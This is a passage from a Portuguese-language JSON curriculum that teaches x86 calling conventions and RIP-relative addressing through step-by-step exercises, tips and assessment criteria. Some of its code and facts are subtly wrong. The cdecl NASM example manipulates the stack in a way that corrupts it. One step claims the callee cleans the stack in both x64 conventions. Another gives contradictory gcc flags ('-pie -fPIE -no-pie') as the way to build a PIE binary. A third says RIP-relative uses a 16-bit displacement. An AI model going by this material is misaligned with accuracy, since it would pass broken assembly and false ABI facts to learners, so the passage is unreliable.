                                  "commonMistakes": "Confundir com 64-bit (System V/Win64); overlook variadic functions em cdecl."
                                }
                              ],
                              "practicalExample": "Exemplo em Assembly NASM 32-bit (cdecl): \nsection .text\nadd_two: ; int add_two(int a, int b)\npop eax ; ret addr\npop ebx ; b\npop ecx ; a\nadd ebx, ecx\npush ebx\npush eax\nret\nmain: push 5 ; b\npush 3 ; a\ncall add_two\nadd esp, 8 ; caller cleanup\n; Para stdcall: ret 8 no add_two, sem add esp.",
                              "finalVerifications": [
                                "Pode diagramar pilha para cdecl e stdcall chamando func(4 params)?",
                                "Explica por que stdcall é usado em WinAPI?",
                                "Identifica instrução de limpeza em disassembly?",
                                "Simula execução de PUSH/CALL/RET sem erros de stack corruption?",
                                "Diferencia caller/callee roles corretamente?",
                                "Reconhece mangling em stdcall (@N)?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de empilhamento (right-to-left) e limpeza da pilha.",
                                "Correta identificação de instruções chave (PUSH, CALL, RET N, ADD ESP).",
                                "Uso apropriado de exemplos Assembly compiláveis.",
                                "Compreensão de registradores de convenção (EAX retorno).",
                                "Capacidade de comparar em tabela/diagrama.",
                                "Aplicação a cenários reais como análise de binários."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: linkage entre source e assembly gerado.",
                                "Sistemas Operacionais: ABIs e syscalls em 32 bits.",
                                "Segurança: buffer overflows explorando convenções de pilha.",
                                "Engenharia Reversa: disassembly de malware usando IDA/Ghidra."
                              ],
                              "realWorldApplication": "Em análise de segurança computacional, identificar convenções em binários permite mapear funções, detectar ROP chains em exploits e debugar malware que abusa de pilha em apps legacy 32-bit."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.3.2",
                            "name": "Descrever convenções em 64 bits",
                            "description": "Detalhar System V AMD64 (primeiros 6 parâmetros em RDI, RSI, etc., resto na pilha) e Microsoft x64 (RCX, RDX, R8, R9), com preservação de registradores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Introdução às Convenções de Chamada em 64 bits",
                                  "subSteps": [
                                    "Estude o conceito geral de convenções de chamada (calling conventions) e sua importância em Assembly 64 bits.",
                                    "Compare brevemente com convenções de 32 bits (ex: stdcall, cdecl).",
                                    "Identifique as duas principais convenções: System V AMD64 (Linux/Unix) e Microsoft x64 (Windows).",
                                    "Revise registradores de uso geral em x86-64: RAX, RDI, RSI, RDX, RCX, R8, R9, etc.",
                                    "Entenda o papel da pilha e registradores de ponto flutuante (XMM/YMM)."
                                  ],
                                  "verification": "Escreva um resumo de 5 linhas explicando por que convenções de 64 bits diferem das de 32 bits e liste as duas principais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação x86-64 ABI (System V e MS)",
                                    "Ferramenta de notas (ex: Notepad++)"
                                  ],
                                  "tips": "Crie um diagrama simples da pilha e registradores para visualizar.",
                                  "learningObjective": "Compreender os fundamentos e diferenças das convenções de chamada em 64 bits.",
                                  "commonMistakes": "Confundir registradores de 32 bits (EAX) com 64 bits (RAX); ignorar otimizações para 64 bits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Convenção System V AMD64",
                                  "subSteps": [
                                    "Memorize a ordem dos primeiros 6 parâmetros: RDI (1º), RSI (2º), RDX (3º), RCX (4º), R8 (5º), R9 (6º).",
                                    "Aprenda que parâmetros adicionais vão para a pilha, alinhada em 16 bytes.",
                                    "Estude passagem de floats/doubles: XMM0-XMM7.",
                                    "Analise exemplos de código Assembly simples com 4-8 argumentos.",
                                    "Pratique descrevendo uma chamada de função com múltiplos tipos de argumentos."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito a passagem de 7 inteiros em uma função.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "PDF System V ABI AMD64",
                                    "Compilador GCC para gerar Assembly (gcc -S)"
                                  ],
                                  "tips": "Use mnemônico 'DiSi DeReCo R Eight Nine' para lembrar RDI, RSI, etc.",
                                  "learningObjective": "Descrever precisamente a convenção System V para parâmetros e pilha.",
                                  "commonMistakes": "Invertir RCX e RDX; esquecer alinhamento da pilha em 16 bytes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Convenção Microsoft x64",
                                  "subSteps": [
                                    "Memorize a ordem: RCX (1º), RDX (2º), R8 (3º), R9 (4º); resto na pilha.",
                                    "Entenda o 'shadow space' ou 'home space': 32 bytes na pilha para os primeiros 4 args.",
                                    "Aprenda floats/doubles em XMM0-XMM3.",
                                    "Estude exemplos de código MSVC gerado.",
                                    "Compare com System V anotando diferenças em uma tabela."
                                  ],
                                  "verification": "Crie uma tabela comparativa com System V para 5 parâmetros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Microsoft x64 ABI",
                                    "Compilador MSVC ou Clang com flags Windows"
                                  ],
                                  "tips": "Lembre 'C ReD X R9' para RCX, RDX, R8, R9; sempre reserve shadow space.",
                                  "learningObjective": "Dominar a convenção MS x64, incluindo shadow space.",
                                  "commonMistakes": "Confundir com System V (RCX é 1º em MS, 4º em System V); ignorar shadow space."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Preservação de Registradores e Aplicação Prática",
                                  "subSteps": [
                                    "Liste registradores callee-saved (RBX, RBP, R12-R15) vs caller-saved (RAX, RDI, etc.).",
                                    "Aprenda regras de preservação em ambas as convenções.",
                                    "Analise um binário real com debugger para observar convenções.",
                                    "Escreva pseudocódigo descrevendo uma chamada completa.",
                                    "Teste com exemplos compilados em Linux e Windows."
                                  ],
                                  "verification": "Explique preservação para uma função que usa RDI e RBX.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Binários de teste compilados (ex: hello world com args)"
                                  ],
                                  "tips": "Use 'callee-saved precisam ser salvos pelo chamado' como regra.",
                                  "learningObjective": "Aplicar convenções completas, incluindo preservação.",
                                  "commonMistakes": "Esquecer de salvar callee-saved; não alinhar pilha corretamente."
                                }
                              ],
                              "practicalExample": "Compile uma função soma(int a, int b, int c, int d, int e) no Linux (System V: args em RDI, RSI, RDX, RCX, pilha) e Windows (MS: RCX, RDX, R8, R9, pilha com shadow). Use GDB/WinDbg para inspecionar registradores/pilha durante a chamada e descreva o fluxo.",
                              "finalVerifications": [
                                "Listar corretamente registradores para 6 primeiros args em System V AMD64.",
                                "Descrever shadow space na convenção Microsoft x64.",
                                "Explicar preservação de RBX em uma chamada de função.",
                                "Diferenciar passagem de floats em ambas convenções.",
                                "Analisar um binário e identificar a convenção usada.",
                                "Criar tabela comparativa completa das duas convenções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na ordem dos registradores (sem erros nos 4 primeiros).",
                                "Compreensão de pilha e alinhamento (16 bytes em System V, 32 shadow em MS).",
                                "Correta identificação de caller vs callee-saved.",
                                "Capacidade de aplicar em exemplos reais via debugger.",
                                "Clareza na descrição escrita/oral de diferenças.",
                                "Uso correto de exemplos com múltiplos tipos de args."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly e baixo nível.",
                                "Sistemas Operacionais (ABIs específicas).",
                                "Engenharia Reversa e Análise de Malware.",
                                "Compiladores e Otimização de Código.",
                                "Segurança Computacional (exploração de binários)."
                              ],
                              "realWorldApplication": "Essencial para reverse engineering de binários em investigações de segurança, debugging de crashes em software nativo, análise de malware que explora calling conventions, e desenvolvimento de ferramentas de baixo nível como loaders ou emuladores."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.3.3",
                            "name": "Comparar e converter convenções",
                            "description": "Comparar passage de parâmetros e limpeza da pilha, com exemplos de adaptação de código 32 bits para 64 bits em chamadas de funções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Convenções de Chamada em x86 (32-bit)",
                                  "subSteps": [
                                    "Estude a convenção CDECL: parâmetros empilhados da direita para esquerda, chamador limpa a pilha.",
                                    "Analise STDCALL: parâmetros da direita para esquerda, callee limpa a pilha.",
                                    "Identifique registradores usados: EAX, EDX, etc., para parâmetros iniciais em algumas convenções.",
                                    "Examine exemplos de código assembly x86 para chamadas de função simples.",
                                    "Pratique desmontando binários x86 com ferramentas como objdump."
                                  ],
                                  "verification": "Liste corretamente 3 diferenças entre CDECL e STDCALL, com exemplos de limpeza da pilha.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86 manuals, IDA Pro ou Ghidra para desmontagem, exemplos de código em C compilado para 32-bit.",
                                  "tips": "Use 'gcc -m32' para compilar e observar o assembly gerado.",
                                  "learningObjective": "Compreender como parâmetros são passados e pilha é gerenciada em x86 32-bit.",
                                  "commonMistakes": "Confundir ordem de empilhamento (esquerda-direita vs direita-esquerda); ignorar limpeza da pilha."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender Convenções de Chamada em x64 (64-bit)",
                                  "subSteps": [
                                    "Estude System V AMD64 (Linux): primeiros 6 inteiros em RDI, RSI, RDX, RCX, R8, R9; floats em XMM0-7; resto na pilha.",
                                    "Analise Microsoft x64 (Windows): RCX, RDX, R8, R9 para primeiros 4; resto na pilha, alinhada a 16 bytes.",
                                    "Note que callee limpa a pilha em ambos; shadow space em Windows.",
                                    "Examine exemplos de código assembly x64 para chamadas.",
                                    "Compare com x86 usando desmontadores."
                                  ],
                                  "verification": "Descreva a ordem de registradores para 4 parâmetros inteiros em ambas convenções x64.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação AMD64 ABI, MS x64 calling convention docs, compiladores como gcc/clang com -m64.",
                                  "tips": "Use 'objdump -d' em binários x64 para visualizar chamadas reais.",
                                  "learningObjective": "Dominar passagem de parâmetros via registradores em x64, eliminando dependência excessiva na pilha.",
                                  "commonMistakes": "Esquecer shadow space no Windows x64; confundir registradores entre ABIs."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças entre x86 e x64",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: registradores vs pilha, limpeza da pilha, alinhamento.",
                                    "Identifique impactos: x86 usa mais pilha (desbalanceamento possível), x64 otimiza registradores.",
                                    "Analise overhead: x64 reduz pressão na pilha, melhora performance.",
                                    "Estude adaptações comuns em código legado 32->64 bits.",
                                    "Pratique identificando diferenças em binários mistos."
                                  ],
                                  "verification": "Preencha uma tabela com 5 diferenças chave e 2 exemplos de código afetado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Planilha ou papel para tabela, binários de teste 32/64-bit.",
                                  "tips": "Foque em funções com >4 parâmetros, onde pilha é crítica.",
                                  "learningObjective": "Identificar e articular diferenças fundamentais para análise comparativa.",
                                  "commonMistakes": "Subestimar impacto de registradores em x64; ignorar ABI-specific rules."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Converter e Adaptar Código de 32-bit para 64-bit",
                                  "subSteps": [
                                    "Pegue um exemplo x86: mov eax, param1; push param2; call func.",
                                    "Converta para x64: mov rcx, param1; mov rdx, param2; call func.",
                                    "Ajuste limpeza da pilha e shadow space se Windows.",
                                    "Compile e teste em ambos arquiteturas.",
                                    "Debugue erros comuns como desalinhamento ou registradores errados."
                                  ],
                                  "verification": "Converta com sucesso 2 funções de exemplo e verifique execução sem crashes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Compilador cross (mingw para 32-bit), debugger como GDB ou x64dbg.",
                                  "tips": "Use inline assembly em C para testar conversões.",
                                  "learningObjective": "Aplicar conhecimento para converter chamadas de funções entre arquiteturas.",
                                  "commonMistakes": "Não alocar shadow space; usar registradores caller-saved incorretamente."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Validar Conversões",
                                  "subSteps": [
                                    "Use disassemblers para comparar before/after.",
                                    "Teste com múltiplos parâmetros e tipos (int, float, pointers).",
                                    "Simule em emuladores como QEMU para cross-arch.",
                                    "Analise stack traces para leaks ou corrupções.",
                                    "Documente lições aprendidas."
                                  ],
                                  "verification": "Execute testes unitários em código convertido sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ghidra/IDA para análise estática, unit tests em C.",
                                  "tips": "Sempre verifique RSP alinhamento antes de call.",
                                  "learningObjective": "Garantir robustez em conversões através de verificações.",
                                  "commonMistakes": "Ignorar endianness ou size_t changes (4->8 bytes)."
                                }
                              ],
                              "practicalExample": "Exemplo x86 (CDECL): push 0x2; push 0x1; call add_two; add esp, 8;\nConvertido x64 (System V): mov rdi, 1; mov rsi, 2; call add_two; // Sem limpeza extra.",
                              "finalVerifications": [
                                "Converta independentemente uma função com 5 parâmetros sem erros.",
                                "Identifique corretamente convenção em binário desmontado x86/x64.",
                                "Explique impacto de conversão em performance da pilha.",
                                "Crie tabela comparativa precisa.",
                                "Debugue e corrija um erro comum de conversão.",
                                "Teste código em ambas arquiteturas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e pilha (90% correto).",
                                "Qualidade da conversão: código executável sem crashes.",
                                "Profundidade da comparação: pelo menos 5 diferenças chave.",
                                "Uso correto de verificações em cada step.",
                                "Clareza em exemplos e documentação.",
                                "Aplicação em contexto real de segurança (ex: análise binária)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Integração com linguagens high-level.",
                                "Reverse Engineering: Análise de binários em ferramentas como Ghidra.",
                                "Segurança Computacional: Exploração de ROP gadgets afetados por convenções.",
                                "Arquitetura de Computadores: Otimização de registradores vs cache.",
                                "Desenvolvimento Cross-Platform: Portabilidade 32/64-bit."
                              ],
                              "realWorldApplication": "Em análise de malware, converter chamadas em binários 32-bit para 64-bit ajuda a adaptar exploits ROP; em desenvolvimento de software legado, facilita migrações para sistemas modernos sem rewrites totais, reduzindo vulnerabilidades de pilha."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.5.4",
                        "name": "Endereçamento Relativo ao RIP",
                        "description": "Introdução às extensões RIP-relative em x86-64, ausentes em 32 bits, para acessos posicionais independentes de ASLR.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.4.1",
                            "name": "Explicar RIP-relative addressing",
                            "description": "Descrever instruções como MOV RAX, [RIP + offset], onde o endereço é calculado como RIP + offset, facilitando relocação de código.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Registrador RIP",
                                  "subSteps": [
                                    "Ler a documentação oficial da Intel sobre registradores em x86-64, focando no RIP.",
                                    "Comparar o RIP com o EIP do modo 32 bits, destacando diferenças em tamanho e uso.",
                                    "Explicar o ciclo de fetch-decode-execute e quando o RIP é atualizado (após o fetch da instrução atual).",
                                    "Executar um programa simples em um debugger e observar o valor de RIP em diferentes pontos."
                                  ],
                                  "verification": "Descrever verbalmente ou por escrito o papel exato do RIP durante a execução de uma instrução, confirmando que aponta para a próxima instrução.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (disponível online)",
                                    "Debugger como GDB, x64dbg ou online como godbolt.org"
                                  ],
                                  "tips": "Sempre pense no RIP como o 'ponteiro de instrução' que avança após cada instrução ser buscada.",
                                  "learningObjective": "Entender o papel fundamental do RIP como registrador de ponteiro de instrução no modo 64 bits.",
                                  "commonMistakes": [
                                    "Confundir o endereço apontado pelo RIP com o endereço da instrução atual.",
                                    "Acreditar que o RIP pode ser modificado diretamente como um registrador de uso geral."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer a Sintaxe das Instruções RIP-Relative",
                                  "subSteps": [
                                    "Estudar exemplos de instruções como MOV RAX, [RIP + offset] e LEA RAX, [RIP + offset].",
                                    "Identificar a notação [RIP + offset] em ferramentas de desassembly como objdump ou IDA Pro.",
                                    "Diferenciar de endereçamento relativo ao IP em 32 bits ou absoluto.",
                                    "Escrever manualmente 3 instruções RIP-relative válidas para diferentes registradores."
                                  ],
                                  "verification": "Listar e explicar corretamente 3 instruções RIP-relative de um snippet de código desmontado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de desassembly como objdump ou Ghidra",
                                    "Exemplos de binários ELF 64 bits simples"
                                  ],
                                  "tips": "Procure pelo padrão [RIP + número hexadecimal] em desassemblies de código moderno.",
                                  "learningObjective": "Reconhecer e decodificar a sintaxe específica de endereçamento relativo ao RIP.",
                                  "commonMistakes": [
                                    "Confundir com [RIP] sem offset ou com base+offset em outros modos.",
                                    "Ignorar que o offset é tipicamente de 32 bits sign-extended."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mecanismo de Cálculo do Endereço",
                                  "subSteps": [
                                    "Aprender que o endereço efetivo = RIP (pós-instrução) + sign-extension do offset de 32 bits para 64 bits.",
                                    "Realizar cálculos manuais: dado RIP=0x400100 e offset=0x1234, calcular endereço.",
                                    "Simular em um emulador ou debugger o cálculo durante execução passo a passo.",
                                    "Comparar com falha em endereçamento absoluto ao relocar código."
                                  ],
                                  "verification": "Resolver 3 exercícios de cálculo de endereço com valores fornecidos, obtendo resultados corretos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal ou Python para sign-extension",
                                    "Emulador como Unicorn Engine ou debugger passo a passo"
                                  ],
                                  "tips": "Lembre: RIP é o valor APÓS o comprimento da instrução atual ser adicionado.",
                                  "learningObjective": "Dominar o cálculo preciso do endereço em RIP-relative addressing.",
                                  "commonMistakes": [
                                    "Usar offset sem sign-extension (ex: tratar como unsigned).",
                                    "Calcular com RIP apontando para a instrução atual em vez da próxima."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Vantagens e Aplicação em Relocação de Código",
                                  "subSteps": [
                                    "Explicar como RIP-relative torna o código position-independent (PIC).",
                                    "Comparar com endereçamento absoluto, que quebra em relocação.",
                                    "Analisar um binário PIC (como libc.so) e identificar usos de RIP-relative.",
                                    "Discutir impacto em cenários como carregamento dinâmico de bibliotecas."
                                  ],
                                  "verification": "Explicar em um parágrafo como RIP-relative facilita relocação, com exemplo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário PIC como /lib64/libc.so",
                                    "Ferramenta readelf para headers ELF"
                                  ],
                                  "tips": "Teste relocando um binário manualmente para ver a diferença.",
                                  "learningObjective": "Compreender os benefícios de RIP-relative para código relocável e segurança.",
                                  "commonMistakes": [
                                    "Subestimar o papel em ASLR, achando que é só otimização.",
                                    "Confundir com relocação estática vs dinâmica."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa 64 bits, a instrução 'MOV RAX, [RIP + 0x10]' em endereço 0x400100 (comprimento 7 bytes) usa RIP=0x400107 + 0x10 = 0x400117 para carregar uma constante da seção .data próxima ao código, permitindo que o executável seja carregado em qualquer base sem patches.",
                              "finalVerifications": [
                                "Calcular corretamente o endereço efetivo dado RIP e offset em 3 cenários.",
                                "Identificar todas as instruções RIP-relative em um snippet de 20 linhas de desassembly.",
                                "Explicar verbalmente o ciclo de atualização do RIP durante execução.",
                                "Demonstrar em debugger o endereço resolvido pausando em uma instrução RIP-relative.",
                                "Comparar acertos/erros com um colega ou autoavaliação."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de endereços (100% correto).",
                                "Uso correto de terminologia técnica (RIP, sign-extension, PIC).",
                                "Profundidade na explicação de benefícios para relocação.",
                                "Qualidade do exemplo prático fornecido.",
                                "Capacidade de identificar em desassembly real."
                              ],
                              "crossCurricularConnections": [
                                "Compiladores: Geração de código position-independent (PIC) em GCC/Clang.",
                                "Sistemas Operacionais: Suporte a ASLR para mitigação de exploits.",
                                "Engenharia Reversa: Análise de binários em ferramentas como IDA Pro.",
                                "Segurança Computacional: Exploração de binários relocáveis em CTFs.",
                                "Arquitetura de Computadores: Evolução de modos de endereçamento."
                              ],
                              "realWorldApplication": "RIP-relative addressing é essencial em bibliotecas compartilhadas modernas (ex: .so no Linux, .dll no Windows), permitindo carregamento em endereços aleatórios via ASLR, fortalecendo a segurança contra ataques de overflow que dependem de endereços fixos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.4.2",
                            "name": "Comparar com endereçamento em 32 bits",
                            "description": "Contrastar com x86 32 bits, que usa EIP mas sem suporte direto a RIP-relative, exigindo PIC (Position Independent Code) mais complexo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar o Endereçamento com EIP em x86 32 bits",
                                  "subSteps": [
                                    "Estude a documentação Intel sobre registradores em x86 32 bits, focando no EIP (Extended Instruction Pointer).",
                                    "Analise como o EIP é atualizado durante a execução de instruções e seu papel no fluxo de controle.",
                                    "Examine exemplos de jumps relativos (como JMP rel8/rel32) que usam deslocamentos relativos ao EIP.",
                                    "Identifique limitações iniciais: EIP não é diretamente acessível em user-mode sem truques.",
                                    "Pratique disassemblando um binário simples x86 32 bits com objdump para visualizar referências a EIP."
                                  ],
                                  "verification": "Descreva em suas palavras o que é EIP e demonstre com um exemplo de assembly como um jump relativo funciona.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86 manuals (Vol. 2), objdump ou IDA Free, um binário de teste x86 32 bits.",
                                  "tips": "Use GDB para setar breakpoints e observar mudanças no EIP com 'info registers eip'.",
                                  "learningObjective": "Compreender o papel fundamental do EIP no endereçamento de instruções em 32 bits.",
                                  "commonMistakes": "Confundir EIP com ESP (stack pointer) ou assumir que EIP pode ser lido diretamente como um registrador geral."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Limitações do PIC em x86 32 bits",
                                  "subSteps": [
                                    "Defina Position Independent Code (PIC) e explique por que é necessário para bibliotecas compartilhadas.",
                                    "Estude técnicas de PIC em 32 bits: uso de GOT (Global Offset Table) e PLT (Procedure Linkage Table).",
                                    "Disasseble um binário PIC 32 bits (ex: libc.so) para ver indiretamente via EIP + offset para GOT.",
                                    "Compare com código position-dependent: mostre falhas ao relocar sem PIC.",
                                    "Discuta overhead: acessos extras à memória para resolução de endereços."
                                  ],
                                  "verification": "Gere um exemplo de assembly 32 bits PIC vs non-PIC e mostre a diferença no tamanho e acessos de memória.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "GDB, objdump, exemplos de código assembly de repositórios como 'x86-assembly-examples' no GitHub.",
                                  "tips": "Compile com 'gcc -shared -fPIC' para gerar PIC e compare dumps.",
                                  "learningObjective": "Identificar as complexidades e overheads do PIC em 32 bits devido à ausência de suporte direto relativo ao IP.",
                                  "commonMistakes": "Ignorar que PIC em 32 bits requer tabelas de lookup, aumentando latência."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir RIP e Endereçamento Relativo em x64",
                                  "subSteps": [
                                    "Revise registradores x64, destacando RIP (Rip, 64-bit Instruction Pointer).",
                                    "Aprenda instruções RIP-relative: MOV reg, [rip + disp], CALL/JMP [rip + disp].",
                                    "Disasseble um binário x64 moderno para identificar padrões RIP-relative (procure por 'rip-relative' no objdump).",
                                    "Explique como RIP é calculado: endereço da próxima instrução após fetch.",
                                    "Teste em GDB x64: observe RIP durante execução de instruções relativas."
                                  ],
                                  "verification": "Escreva e disasseble uma instrução MOV rax, [rip + 0x10] e confirme o cálculo do endereço absoluto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86-64 manuals, GDB com target x86_64, binários ELF x64.",
                                  "tips": "Use 'objdump -d --disassemble-all' com '-M intel' para sintaxe clara.",
                                  "learningObjective": "Dominar o mecanismo de endereçamento RIP-relative e suas vantagens em 64 bits.",
                                  "commonMistakes": "Confundir RIP com RBP (base pointer) ou esquecer que RIP-relative usa disp32/16."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar e Contrastar EIP vs RIP com Foco em PIC",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: EIP (32-bit, indireto via GOT) vs RIP (64-bit, direto relative).",
                                    "Analise PIC em x64: suporte nativo reduz necessidade de GOT/PLT para dados estáticos.",
                                    "Discuta implicações para segurança: ASLR mais fácil em x64 devido a RIP-relative.",
                                    "Examine um exploit real: como ROP em 32 vs 64 bits difere por causa de endereçamento.",
                                    "Sintetize vantagens: performance (menos cache misses), simplicidade de código."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito 3 diferenças chave e 2 impactos em PIC, com exemplos de código.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Planilha ou Markdown para tabela, exemplos de exploits (ex: de CTF writeups).",
                                  "tips": "Use side-by-side diff de objdump 32 vs 64 bits do mesmo código fonte.",
                                  "learningObjective": "Contrastar completamente as abordagens, destacando evoluções arquiteturais.",
                                  "commonMistakes": "Subestimar que x64 ainda usa GOT/PLT para funções dinâmicas, mas simplifica dados."
                                }
                              ],
                              "practicalExample": "Compile um programa C simples que acessa uma variável global: em x86 32 bits (gcc -m32), o access usa [EIP + offset to GOT]; em x64 (gcc -m64), usa [RIP + disp direto]. Disasseble ambos e compare: 32 bits tem ~3 instruções extras via GOT, x64 é direto em 1 instrução.",
                              "finalVerifications": [
                                "Pode listar 4 diferenças chave entre EIP e RIP?",
                                "Explica por que PIC é mais complexo em 32 bits?",
                                "Identifica RIP-relative em um dump de objdump x64?",
                                "Discute impacto em ASLR e performance?",
                                "Compara overhead de memória em exemplos reais?",
                                "Descreve um cenário onde RIP-relative falha (ex: hotpatching)?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção EIP (indireto, 32-bit) vs RIP (direto relative, 64-bit).",
                                "Compreensão profunda de PIC: GOT/PLT em 32 vs simplificado em 64.",
                                "Habilidade em disassemblar e interpretar dumps corretamente.",
                                "Análise de implicações práticas (performance, segurança).",
                                "Uso de exemplos concretos sem erros factuais.",
                                "Capacidade de sintetizar comparações em tabela ou narrativa clara."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender linkage e relocação em compiladores.",
                                "Sistemas Operacionais: ASLR e proteção de memória em ELF/PE.",
                                "Segurança da Informação: Reverse engineering e análise de binários malware.",
                                "Arquitetura de Computadores: Evolução de ISAs (x86 to x64)."
                              ],
                              "realWorldApplication": "Em análise de malware ou CTFs de reverse engineering, compreender EIP vs RIP permite calcular offsets precisos em exploits ROP/JOP, otimizando payloads para x64 (mais comuns hoje) vs legacy 32 bits, e facilita debugging de crashes em ambientes mistos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.4.3",
                            "name": "Analisar exemplos em disassembly",
                            "description": "Interpretar código desmontado com RIP-relative em ferramentas como objdump ou IDA Pro, e discutir benefícios em engenharia reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Ferramentas de Disassembly",
                                  "subSteps": [
                                    "Instale o pacote binutils no Linux (ex: sudo apt install binutils) para objdump.",
                                    "Baixe e instale a versão demo gratuita do IDA Pro ou use Ghidra como alternativa open-source.",
                                    "Compile um programa C simples em 64 bits com flags para PIE: gcc -pie -fPIE -no-pie example.c -o example64.",
                                    "Verifique a arquitetura com file example64 para confirmar x86_64.",
                                    "Execute objdump -d example64 > disassembly.txt para gerar o disassembly inicial."
                                  ],
                                  "verification": "Confirme que objdump ou IDA Pro disassembla o binário corretamente, mostrando instruções x86_64 sem erros de parsing.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Linux terminal ou WSL",
                                    "GCC compiler",
                                    "Binutils package",
                                    "IDA Pro demo ou Ghidra"
                                  ],
                                  "tips": "Use -m intel em objdump para sintaxe Intel mais legível; teste com echo $? após comandos para erros.",
                                  "learningObjective": "Preparar um ambiente funcional para análise de disassembly em 64 bits.",
                                  "commonMistakes": [
                                    "Compilar em 32 bits acidentalmente",
                                    "Esquecer flags PIE para gerar RIP-relative",
                                    "Usar objdump sem -d para disassembly detalhado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Instruções RIP-Relative no Disassembly",
                                  "subSteps": [
                                    "Abra o arquivo disassembly.txt ou carregue no IDA Pro/Ghidra.",
                                    "Procure por instruções como mov rax, [rip + offset] ou lea rdi, [rip - 0x10].",
                                    "Anote o endereço atual do RIP (próxima instrução) e o offset relativo.",
                                    "Calcule o endereço alvo manualmente: endereço_alvo = RIP + offset.",
                                    "Compare com referências absolutas em assembly 32 bits para contrastar."
                                  ],
                                  "verification": "Liste pelo menos 3 instruções RIP-relative com offsets corretos calculados manualmente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Disassembly.txt gerado",
                                    "Calculadora ou script Python simples para offsets",
                                    "Documentação x86_64 Intel"
                                  ],
                                  "tips": "No IDA Pro, clique direito em RIP-relative para ver cross-references; use busca por 'rip' no objdump.",
                                  "learningObjective": "Reconhecer e localizar padrões de endereçamento relativo ao RIP em código desmontado.",
                                  "commonMistakes": [
                                    "Confundir RIP com EIP de 32 bits",
                                    "Ignorar sinal do offset (positivo/negativo)",
                                    "Não ajustar RIP para endereço da próxima instrução"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar e Rastrear o Fluxo de Execução",
                                  "subSteps": [
                                    "Siga o fluxo: trace como o valor carregado via RIP-relative é usado (ex: em uma chamada de função).",
                                    "Use o debugger integrado no IDA Pro (F9) ou gdb com info registers para validar em runtime.",
                                    "Analise como RIP-relative permite Position Independent Code (PIC) em ASLR.",
                                    "Modifique o offset em um hex editor e re-disassemble para observar mudanças.",
                                    "Documente o papel em estruturas de dados globais ou strings."
                                  ],
